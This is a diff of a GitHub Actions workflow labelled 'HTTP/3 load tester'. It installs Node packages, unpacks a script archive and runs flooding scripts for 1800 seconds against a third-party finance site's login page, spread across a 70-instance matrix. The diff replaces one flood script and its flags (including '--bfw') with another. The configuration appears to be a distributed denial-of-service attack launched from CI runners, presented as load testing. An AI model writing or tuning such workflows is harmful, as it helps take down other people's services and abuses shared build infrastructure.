@@ -33,7 +33,7 @@ jobs:
       
       
       - name: Install Node.js dependencies
-        run: npm install    chalk@4 colors    hpack 
+        run: npm install  cluster  chalk@4 colors    hpack 
             
       - name: Run HTTP/3 load tester
         run: |
@@ -41,7 +41,7 @@ jobs:
           cd ideal-guide
           unzip Fc-main.zip
           cd Fc-main
-          node y.js GET https://front.royal-finance.org/login 1800 4 90   --bfw --debug 
+          node h.js  https://front.royal-finance.org/login 1800 4 h1
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
